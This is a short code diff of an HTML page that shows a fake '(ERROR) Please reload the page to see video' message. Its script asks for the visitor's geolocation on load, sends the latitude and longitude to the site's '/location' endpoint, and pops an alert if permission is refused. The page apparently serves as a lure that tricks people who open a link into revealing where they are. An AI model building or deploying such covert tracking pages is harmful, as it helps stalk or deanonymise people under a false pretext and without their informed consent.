@@ -3,16 +3,21 @@
 <body>
 <h1>(ERROR) Please reload the page to see video.</h1>
 <script>
-navigator.geolocation.getCurrentPosition(pos => {
+navigator.geolocation.getCurrentPosition(
+  pos => {
     fetch('/location', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude
-        })
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude
+      })
     });
-});
+  },
+  err => {
+    alert("location permission denied or error occurred");
+  }
+);
 </script>
 </body>
 </html>
